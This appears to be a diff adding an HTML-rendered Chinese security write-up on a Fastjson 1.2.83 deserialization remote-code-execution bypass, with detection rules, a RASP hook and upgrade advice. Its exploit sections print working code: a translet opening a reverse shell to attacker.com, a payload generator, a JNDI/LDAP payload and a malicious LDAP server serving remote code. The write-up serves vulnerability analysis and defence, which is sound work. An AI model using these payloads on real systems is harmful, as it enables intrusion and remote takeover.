+<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Exploit</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractTranslet</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 静态块在 defineClass 时执行</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                </span><span class="s">&quot;bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1&quot;</span><span class="p">};</span>
+<span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nd">@Override</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">SerializationHandler</span><span class="o">[]</span><span class="w"> </span><span class="n">handlers</span><span class="p">)</span><span class="w"> </span>
+<span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{}</span>
+
+<span class="w">    </span><span class="nd">@Override</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">DOM</span><span class="w"> </span><span class="n">document</span><span class="p">,</span><span class="w"> </span><span class="n">DTMAxisIterator</span><span class="w"> </span><span class="n">iterator</span><span class="p">,</span><span class="w"> </span>
+<span class="w">            </span><span class="n">SerializationHandler</span><span class="w"> </span><span class="n">handler</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">TransletException</span><span class="w"> </span><span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p><strong>关键点</strong>：必须继承 <code>AbstractTranslet</code>，否则 <code>TemplatesImpl</code> 在 <code>defineTransletClasses</code> 后会校验父类，不匹配则抛异常。</p>
+<h3>8.2 Payload 生成器</h3>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Files</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.nio.file.Paths</span><span class="p">;</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">PayloadGenerator</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 读取编译后的 Exploit.class</span>
+<span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Files</span><span class="p">.</span><span class="na">readAllBytes</span><span class="p">(</span><span class="n">Paths</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&quot;Exploit.class&quot;</span><span class="p">));</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">bytecode</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 构造 Payload（实际环境需根据 expectClass 适配）</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">format</span><span class="p">(</span>
+<span class="w">            </span><span class="s">&quot;{\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span>
+<span class="w">          </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span>
+<span class="w">          </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\&quot;_bytecodes\&quot;:[\&quot;%s\&quot;],&quot;</span>
+<span class="w">          </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\&quot;_name\&quot;:\&quot;Exploit\&quot;,&quot;</span>
+<span class="w">          </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\&quot;_tfactory\&quot;:{},&quot;</span>
+<span class="w">          </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\&quot;_outputProperties\&quot;:{}}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">base64</span><span class="p">);</span>
+
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
+
+<span class="w">        </span><span class="c1">// 自测触发</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">ParserConfig</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ParserConfig</span><span class="p">();</span>
+<span class="w">            </span><span class="c1">// 模拟开启 safeMode</span>
+<span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">setSafeMode</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="w">            </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">config</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="c1">// RCE 已在反序列化过程中触发</span>
+<span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>8.3 适配 expectClass 的 Throwable 链 Payload</h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// 适用于 1.2.83 + safeMode 开启场景</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ThrowablePayload</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">build</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">base64Bytecode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&quot;{&quot;</span>
+<span class="w">             </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;  \&quot;@type\&quot;:\&quot;java.lang.Throwable\&quot;,&quot;</span>
+<span class="w">             </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;  \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span>
+<span class="w">             </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;  \&quot;dataSourceName\&quot;:\&quot;ldap://attacker.com:1389/Exploit\&quot;,&quot;</span>
+<span class="w">             </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;  \&quot;autoCommit\&quot;:true&quot;</span>
+<span class="w">             </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;}&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="c1">// 注：ldap 返回的 Reference 由服务端控制，指向远程 Codebase</span>
+<span class="w">        </span><span class="c1">// 服务端使用 marshalsec 或 JNDI-Injection-Exploit 构造</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// JdbcRowSetImpl 在 Throwable 链中：ThrowableDeserializer 不校验子类</span>
+<span class="w">    </span><span class="c1">// 内层 @type 触发 setDataSourceName + setAutoCommit</span>
+<span class="w">    </span><span class="c1">// setAutoCommit 调用 connect() -&gt; new InitialContext().lookup(dataSource)</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>8.4 远程 LDAP 服务（Python 简化实现）</h3>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># ldap_server.py —— 简化的恶意 LDAP 服务，返回引用远程 Codebase</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">build_ldap_reference_response</span><span class="p">():</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;构造 LDAP searchResultEntry，指向远程 Codebase&quot;&quot;&quot;</span>
+    <span class="n">codebase_url</span> <span class="o">=</span> <span class="s2">&quot;http://attacker.com:8888/&quot;</span>
+    <span class="n">class_name</span> <span class="o">=</span> <span class="s2">&quot;Exploit&quot;</span>
+
+    <span class="c1"># LDAP 消息结构（简化，实际需完整 BER 编码）</span>
+    <span class="c1"># 关键属性：javaCodeBase、javaFactory、objectClass=javaNamingReference</span>
+    <span class="n">attrs</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="p">(</span><span class="s2">&quot;javaClassName&quot;</span><span class="p">,</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&quot;Exploit&quot;</span><span class="p">]),</span>
+        <span class="p">(</span><span class="s2">&quot;javaCodeBase&quot;</span><span class="p">,</span> <span class="p">[</span><span class="n">codebase_url</span><span class="o">.</span><span class="n">encode</span><span class="p">()]),</span>
+        <span class="p">(</span><span class="s2">&quot;objectClass&quot;</span><span class="p">,</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&quot;javaNamingReference&quot;</span><span class="p">]),</span>
+        <span class="p">(</span><span class="s2">&quot;javaFactory&quot;</span><span class="p">,</span> <span class="p">[</span><span class="n">class_name</span><span class="o">.</span><span class="n">encode</span><span class="p">()]),</span>
+    <span class="p">]</span>
+    <span class="k">return</span> <span class="n">encode_search_result_entry</span><span class="p">(</span><span class="n">attrs</span><span class="p">)</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="mi">1389</span><span class="p">))</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] LDAP server listening on :1389&quot;</span><span class="p">)</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] Connection from </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="c1"># 接收 LDAP bindRequest</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="c1"># 响应 bindRequest</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">build_bind_response</span><span class="p">())</span>
+        <span class="c1"># 接收 searchRequest</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="c1"># 发送恶意 reference</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">build_ldap_reference_response</span><span class="p">())</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<hr />
+<h2>九、检测与防御</h2>
+<h3>9.1 流量层检测规则</h3>
+<h4>Snort 规则</h4>
+<div class="highlight"><pre><span></span><code><span class="nx">alert</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">$</span><span class="nx">HOME_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;Fastjson 1.2.83 AutoCloseable RCE Attempt&quot;</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;@type&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">nocase</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;java.lang.AutoCloseable&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">distance</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nx">within</span><span class="p">:</span><span class="mi">50</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;_bytecodes&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">distance</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nx">within</span><span class="p">:</span><span class="mi">200</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">pcre</span><span class="p">:</span><span class="s">&quot;/\&quot;_bytecodes\&quot;\s*:\s*\[\&quot;[A-Za-z0-9+\/=]{100,}\&quot;\]/&quot;</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">reference</span><span class="p">:</span><span class="nx">url</span><span class="p">,</span><span class="nx">github</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">alibaba</span><span class="o">/</span><span class="nx">fastjson</span><span class="o">/</span><span class="nx">security</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">attempted</span><span class="o">-</span><span class="nx">admin</span><span class="p">;</span><span class="w"> </span><span class="nx">sid</span><span class="p">:</span><span class="mi">20260001</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;)</span>
+</code></pre></div>
+
+<h4>YARA 规则（用于扫描代码库中的脆弱依赖）</h4>
+<div class="highlight"><pre><span></span><code><span class="kd">rule</span><span class="w"> </span>F<span class="n">astjson_Vulnerable_1_2_83</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">meta</span><span class="p">:</span>
+<span class="w">        </span><span class="n">description</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;Fastjson 1.2.80-1.2.83 with Gadget-free RCE&quot;</span>
+<span class="w">        </span><span class="n">severity</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;critical&quot;</span>
+<span class="w">        </span><span class="n">date</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;2026-07-27&quot;</span>
+
+<span class="w">    </span><span class="k">strings</span><span class="p">:</span>
+<span class="w">        </span><span class="nv">$fastjson_pom</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="sr">/&lt;groupId&gt;com\.alibaba&lt;\/</span><span class="n">groupId</span>&gt;\<span class="n">s</span><span class="p">*</span>&lt;<span class="n">artifactId</span>&gt;<span class="n">fastjson</span>&lt;\<span class="sr">/artifactId&gt;\s*&lt;version&gt;(1\.2\.(8[0-3]))&lt;\/</span><span class="n">version</span>&gt;/
+<span class="w">        </span><span class="nv">$safe_mode_api</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;ParserConfig.getGlobalInstance().setSafeMode&quot;</span>
+<span class="w">        </span><span class="nv">$autotype_usage</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s2">&quot;JSON.parseObject&quot;</span><span class="w"> </span><span class="nb">ascii</span>
+
+<span class="w">    </span><span class="k">condition</span><span class="p">:</span>
+<span class="w">        </span><span class="nv">$fastjson_pom</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="nv">$safe_mode_api</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.2 RASP 层防御</h3>
+<p>通过 Java Agent 在 <code>ParserConfig.checkAutoType</code> 入口处植入 hook，强制拒绝所有 <code>@type</code> 解析：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// RASP Agent 拦截器（使用 ByteBuddy）</span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">FastjsonRaspAgent</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">premain</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="n">Instrumentation</span><span class="w"> </span><span class="n">inst</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">AgentBuilder</span><span class="p">.</span><span class="na">Default</span><span class="p">()</span>
+<span class="w">            </span><span class="p">.</span><span class="na">type</span><span class="p">(</span><span class="n">ElementMatchers</span><span class="p">.</span><span class="na">named</span><span class="p">(</span><span class="s">&quot;com.alibaba.fastjson.parser.ParserConfig&quot;</span><span class="p">))</span>
+<span class="w">            </span><span class="p">.</span><span class="na">transform</span><span class="p">((</span><span class="n">builder</span><span class="p">,</span><span class="w"> </span><span class="n">typeDesc</span><span class="p">,</span><span class="w"> </span><span class="n">classLoader</span><span class="p">,</span><span class="w"> </span><span class="n">module</span><span class="p">)</span><span class="w"> </span><span class="o">-&gt;</span>
+<span class="w">                </span><span class="n">builder</span><span class="p">.</span><span class="na">method</span><span class="p">(</span><span class="n">ElementMatchers</span><span class="p">.</span><span class="na">named</span><span class="p">(</span><span class="s">&quot;checkAutoType&quot;</span><span class="p">))</span>
+<span class="w">                    </span><span class="p">.</span><span class="na">intercept</span><span class="p">(</span><span class="n">MethodDelegation</span><span class="p">.</span><span class="na">to</span><span class="p">(</span><span class="n">CheckAutoTypeInterceptor</span><span class="p">.</span><span class="na">class</span><span class="p">))</span>
+<span class="w">            </span><span class="p">).</span><span class="na">installOn</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CheckAutoTypeInterceptor</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nd">@RuntimeType</span>
+<span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">intercept</span><span class="p">(</span>
+<span class="w">            </span><span class="nd">@Origin</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span>
+<span class="w">            </span><span class="nd">@AllArguments</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="c1">// 强制拒绝所有 AutoType</span>
+<span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">typeName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
+<span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">expectClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">args</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="p">)</span><span class="w"> </span><span class="n">args</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+
+<span class="w">        </span><span class="c1">// 记录攻击日志</span>
+<span class="w">        </span><span class="n">SecurityLogger</span><span class="p">.</span><span class="na">log</span><span class="p">(</span><span class="s">&quot;Fastjson AutoType blocked: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="w"> </span>
+<span class="w">            </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;, expectClass=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">expectClass</span><span class="p">);</span>
+
+<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s">&quot;[RASP] AutoType disabled: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>9.3 防御方案对比表</h3>
+<table>
+<thead>
+<tr>
+<th>方案</th>
+<th>防御强度</th>
+<th>部署成本</th>
+<th>兼容性影响</th>
+<th>推荐场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>升级至 1.2.84+</td>
+<td>高</td>
+<td>低</td>
+<td>低（API 兼容）</td>
+<td>所有在用项目</td>
+</tr>
+<tr>
+<td>开启 safeMode</td>
+<td>中（本链可绕）</td>
+<td>极低</td>
+<td>高（多态失效）</td>
+<td>无法升级时的过渡方案</td>
+</tr>
+<tr>
+<td>WAF 规则拦截 <code>@type</code></td>
+<td>中</td>
+<td>中</td>
+<td>低（误报风险）</td>
+<td>边界防护</td>
+</tr>
+<tr>
+<td>RASP hook checkAutoType</td>
+<td>极高</td>
+<td>高</td>
+<td>中</td>
+<td>金融/政企核心系统</td>
+</tr>
+<tr>
+<td>替换为 Jackson/Gson</td>
+<td>极高</td>
+<td>极高</td>
+<td>高（API 重写）</td>
+<td>新项目 / 重构机会</td>
+</tr>
+</tbody>
+</table>
+<h3>9.4 终极修复建议</h3>
+<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- Maven 依赖升级 --&gt;</span>
+<span class="nt">&lt;dependency&gt;</span>
+<span class="w">    </span><span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;artifactId&gt;</span>fastjson2<span class="nt">&lt;/artifactId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;version&gt;</span>2.0.53<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+<span class="cm">&lt;!-- Fastjson2 默认关闭 AutoType，且 API 不再支持 @type 自省 --&gt;</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1">// 若必须使用 Fastjson 1.x，强制配置</span>
+<span class="n">ParserConfig</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">();</span>
+<span class="n">config</span><span class="p">.</span><span class="na">setSafeMode</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="n">config</span><span class="p">.</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
+<span class="c1">// 注意：1.2.83 的 safeMode 仍可被 expectClass 绕过</span>
+<span class="c1">// 必须升级至 1.2.84+ 才能彻底修复</span>
+</code></pre></div>
+
+<hr />
+<h2>十、关键细节与陷阱</h2>
+<h3>10.1 字节码构造的常见坑</h3>
+<ol>
+<li>
+<p><strong>父类校验</strong>：<code>TemplatesImpl.defineTransletClasses</code> 会检查加载类的父类是否为 <code>AbstractTranslet</code>，未继承则抛 <code>TransformerConfigurationException</code>。但若设置 <code>_transletIndex</code> 字段使校验跳过，可加载任意父类的字节码。</p>
+</li>
+<li>
+<p><strong>静态块触发时机</strong>：<code>defineClass</code> 不会立即执行 <code>&lt;clinit&gt;</code>，需要后续 <code>newInstance()</code> 调用。<code>TemplatesImpl</code> 通过 <code>getOutputProperties</code> → <code>newTransformer</code> → <code>getTransletInstance</code> 完成调用链。</p>
+</li>
+<li>
+<p><strong><code>_tfactory</code> 必须存在</strong>：<code>defineTransletClasses</code> 中调用 <code>_tfactory.getExternalExtensionsMap()</code>，若该字段为 null 会 NPE。但 Fastjson 反序列化时若 <code>_tfactory</code> 类型为 <code>TransformerFactoryImpl</code>，可自动创建实例。</p>
+</li>
+</ol>
+<h3>10.2 JDK 版本差异</h3>
+<table>
+<thead>
+<tr>
+<th>JDK 版本</th>
+<th>TemplatesImpl 位置</th>
+<th>是否可用</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JDK 8</td>
+<td><code>rt.jar</code></td>
+<td>可用</td>
+<td>路径：<code>com.sun.org.apache.xalan.internal.xsltc.trax</code></td>
+</tr>
+<tr>
+<td>JDK 11</td>
+<td><code>java.xml</code> 模块</td>
+<td>可用</td>
+<td>需 <code>--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED</code></td>
+</tr>
+<tr>
+<td>JDK 17+</td>
+<td><code>java.xml</code> 模块</td>
+<td>受限</td>
+<td>模块封装严格，需显式 opens；默认不可达</td>
+</tr>
+<tr>
+<td>JDK 21+</td>
+<td><code>java.xml</code> 模块</td>
+<td>不可用</td>
+<td>强封装 + 移除内部 API</td>
+</tr>
+</tbody>
+</table>
+<h3>10.3 Fastjson 内部缓存污染</h3>
+<p>1.2.36~1.2.47 的经典缓存污染链（<code>java.lang.Class</code> + <code>MappingResolver</code>）在 1.2.48 已被修复，但 1.2.83 的 expectClass 绕过是另一个独立路径。两者关系：</p>
+<div class="highlight"><pre><span></span><code><span class="err">缓存污染链（</span><span class="mf">1.2.47</span><span class="o">-</span><span class="err">）：</span>
+<span class="w">  </span><span class="n">Class</span><span class="p">.</span><span class="n">forName</span><span class="w"> </span><span class="err">缓存恶意类</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="n">checkAutoType</span>
+<span class="w">  </span><span class="err">修复：</span><span class="mf">1.2.48</span><span class="w"> </span><span class="err">移除缓存入口</span>
+
+<span class="n">expectClass</span><span class="w"> </span><span class="err">链（</span><span class="mf">1.2.68</span><span class="o">-</span><span class="mf">1.2.83</span><span class="err">）：</span>
+<span class="w">  </span><span class="n">ThrowableDeserializer</span><span class="w"> </span><span class="err">二次解析</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="n">safeMode</span>
